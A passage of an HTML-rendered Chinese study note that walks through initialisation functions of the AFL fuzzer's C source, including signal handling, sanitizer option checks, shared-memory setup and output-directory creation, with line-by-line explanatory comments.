class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Set up signal handlers. More complicated that needs to be, because libc on</span><br><span class="hljs-comment">   Solaris doesn&#x27;t resume interrupted reads(), sets SA_RESETHAND when you call</span><br><span class="hljs-comment">   siginterrupt(), and does other unnecessary things. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_signal_handlers</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span>  <span class="hljs-comment">// 创建sigaction结构体</span><br><br>  sa.sa_handler   = <span class="hljs-literal">NULL</span>;<br>  sa.sa_flags     = SA_RESTART;<br>  sa.sa_sigaction = <span class="hljs-literal">NULL</span>;<br><br>  sigemptyset(&amp;sa.sa_mask);     <span class="hljs-comment">// 创建空的信号屏蔽字，即不屏蔽任何信息</span><br><br>  <span class="hljs-comment">/* Various ways of saying &quot;stop&quot;. */</span><br><br>  sa.sa_handler = handle_stop_sig;      <span class="hljs-comment">// 设置处理stop信号的句柄</span><br>  sigaction(SIGHUP, &amp;sa, <span class="hljs-literal">NULL</span>);<br>  sigaction(SIGINT, &amp;sa, <span class="hljs-literal">NULL</span>);<br>  sigaction(SIGTERM, &amp;sa, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* Exec timeout notifications. */</span><br><br>  sa.sa_handler = handle_timeout;       <span class="hljs-comment">// 设置处理超时信号的句柄</span><br>  sigaction(SIGALRM, &amp;sa, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* Window resize */</span><br><br>  sa.sa_handler = handle_resize;        <span class="hljs-comment">// 设置处理窗口大小变化的句柄</span><br>  sigaction(SIGWINCH, &amp;sa, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* SIGUSR1: skip entry */</span><br><br>  sa.sa_handler = handle_skipreq;       <span class="hljs-comment">// 设置处理用户自定义信号的句柄</span><br>  sigaction(SIGUSR1, &amp;sa, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* Things we don&#x27;t care about. */</span><br><br>  sa.sa_handler = SIG_IGN;      <span class="hljs-comment">// 不必关心的信号</span><br>  sigaction(SIGTSTP, &amp;sa, <span class="hljs-literal">NULL</span>);<br>  sigaction(SIGPIPE, &amp;sa, <span class="hljs-literal">NULL</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h3><p>检测asan与msan选项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check ASAN options. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">check_asan_opts</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  u8* x = getenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>);       <span class="hljs-comment">// 获取环境变量ASAN_OPTIONS</span><br><br>  <span class="hljs-keyword">if</span> (x) &#123;      <span class="hljs-comment">// 检测环境变量的值，若遇到错误设置则退出</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(x, <span class="hljs-string">&quot;abort_on_error=1&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(x, <span class="hljs-string">&quot;symbolize=0&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);<br><br>  &#125;<br><br>  x = getenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>);   <span class="hljs-comment">// 获取环境变量MSAN_OPTIONS</span><br><br>  <span class="hljs-keyword">if</span> (x) &#123;      <span class="hljs-comment">// // 检测环境变量的值，若遇到错误设置则退出</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(x, <span class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR)))<br>      FATAL(<span class="hljs-string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span><br>            STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot; - please fix!&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strstr</span>(x, <span class="hljs-string">&quot;symbolize=0&quot;</span>))<br>      FATAL(<span class="hljs-string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);<br><br>  &#125;<br><br>&#125; <br></code></pre></td></tr></table></figure><h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p>修正out_dir与sync_dir。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Validate and fix up out_dir and sync_dir when using -S. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fix_up_sync</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* x = sync_id;<br><br>  <span class="hljs-keyword">if</span> (dumb_mode)        <span class="hljs-comment">// 若是简易模式，报错并退出</span><br>    FATAL(<span class="hljs-string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (skip_deterministic) &#123;     <span class="hljs-comment">// 若设置skip_deterministic，报错并退出</span><br><br>    <span class="hljs-keyword">if</span> (force_deterministic)<br>      FATAL(<span class="hljs-string">&quot;use -S instead of -M -d&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      FATAL(<span class="hljs-string">&quot;-S already implies -d&quot;</span>);<br><br>  &#125;<br><br>  <span class="hljs-keyword">while</span> (*x) &#123;  <span class="hljs-comment">// 遍历sync_id，并检测格式是否正确</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="hljs-string">&#x27;-&#x27;</span>)<br>      FATAL(<span class="hljs-string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);<br><br>    x++;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(sync_id) &gt; <span class="hljs-number">32</span>) FATAL(<span class="hljs-string">&quot;Fuzzer ID too long&quot;</span>);        <span class="hljs-comment">// 若sync_id长度大于32，报错并退出</span><br><br>  x = alloc_printf(<span class="hljs-string">&quot;%s/%s&quot;</span>, out_dir, sync_id);<br><br>  sync_dir = out_dir;   <span class="hljs-comment">// 设置sync_dir为out_dir</span><br>  out_dir  = x; <span class="hljs-comment">// 设置out_dir为out_dir/sync_id的形式</span><br><br>  <span class="hljs-keyword">if</span> (!force_deterministic) &#123;   <span class="hljs-comment">// 若force_deterministic为空，则设置skip_deterministic与use_splicing为1</span><br>    skip_deterministic = <span class="hljs-number">1</span>;<br>    use_splicing = <span class="hljs-number">1</span>;<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h3><p>保存argv变量到<code>orig_cmdline</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">save_cmdline</span><span class="hljs-params">(u32 argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  u32 len = <span class="hljs-number">1</span>, i;<br>  u8* buf;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i++)    <span class="hljs-comment">// 遍历argv，获取参数总长度</span><br>    len += <span class="hljs-built_in">strlen</span>(argv[i]) + <span class="hljs-number">1</span>;<br>  <br>  buf = orig_cmdline = ck_alloc(len);   <span class="hljs-comment">// orig_cmdline与buf分配空间</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i++) &#123;  <span class="hljs-comment">// 遍历argv，并将argv[i]复制到buf中，若不是最后一个参数，则添加&#x27; &#x27;分隔参数</span><br><br>    u32 l = <span class="hljs-built_in">strlen</span>(argv[i]);<br><br>    <span class="hljs-built_in">memcpy</span>(buf, argv[i], l);<br>    buf += l;<br><br>    <span class="hljs-keyword">if</span> (i != argc - <span class="hljs-number">1</span>) *(buf++) = <span class="hljs-string">&#x27; &#x27;</span>;<br><br>  &#125;<br><br>  *buf = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 结尾赋值为空</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h3><p>获取<code>-T</code>参数指定的目标程序名称或者根据程序路径生成的程序名称。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Trim and possibly create a banner for the run. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fix_up_banner</span><span class="hljs-params">(u8* name)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (!use_banner) &#123;    <span class="hljs-comment">// 若use_banner为空，该值通过-T参数设置</span><br><br>    <span class="hljs-keyword">if</span> (sync_id) &#123;      <span class="hljs-comment">// 若sync_id不为空，设置use_banner为sync_id</span><br><br>      use_banner = sync_id;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// 否则提取name最后一个&#x27;/&#x27;后的值，也即目标程序名作为use_banner</span><br><br>      u8* trim = <span class="hljs-built_in">strrchr</span>(name, <span class="hljs-string">&#x27;/&#x27;</span>);<br>      <span class="hljs-keyword">if</span> (!trim) use_banner = name; <span class="hljs-keyword">else</span> use_banner = trim + <span class="hljs-number">1</span>;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(use_banner) &gt; <span class="hljs-number">40</span>) &#123;        <span class="hljs-comment">// 若use_banner长度大于40，分配长度为44的空间存储</span><br><br>    u8* tmp = ck_alloc(<span class="hljs-number">44</span>);<br>    <span class="hljs-built_in">sprintf</span>(tmp, <span class="hljs-string">&quot;%.40s...&quot;</span>, use_banner);<br>    use_banner = tmp;<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h3><p>检测是否在tty终端上运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if we&#x27;re on TTY. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">check_if_tty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">ws</span>;</span><br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_NO_UI&quot;</span>)) &#123;    <span class="hljs-comment">// 获取环境变量AFL_NO_UI，若不为空，打印提示消息并设置not_on_tty=1，返回</span><br>    OKF(<span class="hljs-string">&quot;Disabling the UI because AFL_NO_UI is set.&quot;</span>);<br>    not_on_tty = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (ioctl(<span class="hljs-number">1</span>, TIOCGWINSZ, &amp;ws)) &#123;      <span class="hljs-comment">// 动态获取窗口值大小</span><br><br>    <span class="hljs-keyword">if</span> (errno == ENOTTY) &#123;      <span class="hljs-comment">// 若error == ENOTTY，打印提示消息并设置not_on_tty=1，返回</span><br>      OKF(<span class="hljs-string">&quot;Looks like we&#x27;re not running on a tty, so I&#x27;ll be a bit less verbose.&quot;</span>);<br>      not_on_tty = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h3><p>获取CPU核心数量。</p><h3 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h3><p>绑定空闲的cpu。</p><h3 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h3><p>检测core，确保core dump不会进入程序。</p><h3 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h3><p>检测cpu管理者。</p><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h3><p>若设置环境变量<code>AFL_POST_LIBRARY</code>，则加载函数<code>afl_postprocess</code>，后续<code>common_fuzz_stuff</code>会调用该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Load postprocessor, if available. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_post</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-type">void</span>* dh;<br>  u8* fn = getenv(<span class="hljs-string">&quot;AFL_POST_LIBRARY&quot;</span>);  <span class="hljs-comment">// 获取环境变量AFL_POST_LIBRARY</span><br>  u32 tlen = <span class="hljs-number">6</span>;<br><br>  <span class="hljs-keyword">if</span> (!fn) <span class="hljs-keyword">return</span>;      <span class="hljs-comment">// 若fn为空，直接返回</span><br><br>  ACTF(<span class="hljs-string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);       <span class="hljs-comment">// 打印提示信息</span><br><br>  dh = dlopen(fn, RTLD_NOW);    <span class="hljs-comment">// 打开动态链接库fn，并指定模式为RTLD_NOW</span><br>  <span class="hljs-keyword">if</span> (!dh) FATAL(<span class="hljs-string">&quot;%s&quot;</span>, dlerror());      <span class="hljs-comment">// 若打开失败，报错并退出</span><br><br>  post_handler = dlsym(dh, <span class="hljs-string">&quot;afl_postprocess&quot;</span>);  <span class="hljs-comment">// 加载afl_postprocess，并设置为post_handler，后续common_fuzz_stuff函数会调用post_handler</span><br>  <span class="hljs-keyword">if</span> (!post_handler) FATAL(<span class="hljs-string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);<br><br>  <span class="hljs-comment">/* Do a quick test. It&#x27;s better to segfault now than later =) */</span><br><br>  post_handler(<span class="hljs-string">&quot;hello&quot;</span>, &amp;tlen); <span class="hljs-comment">// afl_postprocess函数测试</span><br><br>  OKF(<span class="hljs-string">&quot;Postprocessor installed successfully.&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h3><p>设置共享内存<code>trace_bits</code>，初始化<code>virgin_bits</code>。</p><p><a href="https://www.cnblogs.com/52php/p/5861372.html">Linux进程间通信（六）：共享内存 shmget()、shmat()、shmdt()、shmctl()</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);   <span class="hljs-comment">// 若in_bitmap为空，初始化virgin_bits为0xff</span><br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);  <span class="hljs-comment">// 初始化virgin_tmout为0xff</span><br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);  <span class="hljs-comment">// 初始化virgin_crash为0xff</span><br><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);  <span class="hljs-comment">// 创建MAP_size大小的共享内存，并返回共享id</span><br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);   <span class="hljs-comment">// 注册程序终止函数，调用remove_shm函数删除共享内存</span><br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id); <span class="hljs-comment">// 为shm_str分配空间</span><br><br>  <span class="hljs-comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span><br><span class="hljs-comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span><br><span class="hljs-comment">     fork server commands. This should be replaced with better auto-detection</span><br><span class="hljs-comment">     later on, perhaps? */</span><br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);      <span class="hljs-comment">// 若dump_mode为空，设置shm_str为环境变量SHM_ENV_VAR</span><br>                                                        <span class="hljs-comment">// __afl_maybe_log获取shm_id，从而获取到共享内存trace_bits，并设置对应值</span><br><br>  ck_free(shm_str);<br><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 启动共享内存的访问，并链接到当前进程空间，赋值给trace_bits</span><br>  <br>  <span class="hljs-keyword">if</span> (trace_bits == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h3><p>初始化<code>count_class_lookup16</code>数组，加快<code>trace_bits</code>路径的统计速度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> u8 count_class_lookup8[<span class="hljs-number">256</span>] = &#123;    <span class="hljs-comment">// 调整0~255之间的命中次数为指定值</span><br><br>  [<span class="hljs-number">0</span>]           = <span class="hljs-number">0</span>,<br>  [<span class="hljs-number">1</span>]           = <span class="hljs-number">1</span>,<br>  [<span class="hljs-number">2</span>]           = <span class="hljs-number">2</span>,<br>  [<span class="hljs-number">3</span>]           = <span class="hljs-number">4</span>,<br>  [<span class="hljs-number">4</span> ... <span class="hljs-number">7</span>]     = <span class="hljs-number">8</span>,<br>  [<span class="hljs-number">8</span> ... <span class="hljs-number">15</span>]    = <span class="hljs-number">16</span>,<br>  [<span class="hljs-number">16</span> ... <span class="hljs-number">31</span>]   = <span class="hljs-number">32</span>,<br>  [<span class="hljs-number">32</span> ... <span class="hljs-number">127</span>]  = <span class="hljs-number">64</span>,<br>  [<span class="hljs-number">128</span> ... <span class="hljs-number">255</span>] = <span class="hljs-number">128</span><br><br>&#125;;<br><br><span class="hljs-type">static</span> u16 count_class_lookup16[<span class="hljs-number">65536</span>];<br><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">init_count_class16</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;  <span class="hljs-comment">// 将count_class_lookup8映射到count_class_lookup16中</span><br>                                        <span class="hljs-comment">// AFL后续统计命中次数时，一次性处理两个字节。所以有了count_class_lookup16，只是为了加快处理速度，提高处理效率</span><br><br>  u32 b1, b2;<br><br>  <span class="hljs-keyword">for</span> (b1 = <span class="hljs-number">0</span>; b1 &lt; <span class="hljs-number">256</span>; b1++) <br>    <span class="hljs-keyword">for</span> (b2 = <span class="hljs-number">0</span>; b2 &lt; <span class="hljs-number">256</span>; b2++)<br>      count_class_lookup16[(b1 &lt;&lt; <span class="hljs-number">8</span>) + b2] = <br>        (count_class_lookup8[b1] &lt;&lt; <span class="hljs-number">8</span>) |<br>        count_class_lookup8[b2];<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h3><p>为out_dir文件夹创建多个目录并保存打开文件的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Prepare output directories and fds. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_dirs_fds</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* tmp;<br>  s32 fd;<br><br>  ACTF(<span class="hljs-string">&quot;Setting up output directories...&quot;</span>);     <span class="hljs-comment">// 设置输出目录</span><br><br>  <span class="hljs-keyword">if</span> (sync_id &amp;&amp; mkdir(sync_dir, <span class="hljs-number">0700</span>) &amp;&amp; errno != EEXIST)      <span class="hljs-comment">// 若sync_id不为空，创建目录sync_dir</span><br>      PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, sync_dir);<br><br>  <span class="hljs-keyword">if</span> (mkdir(out_dir, <span class="hljs-number">0700</span>)) &#123;   <span class="hljs-comment">// 创建目录out_dir</span><br><br>    <span class="hljs-keyword">if</span> (errno != EEXIST) PFATAL(<span 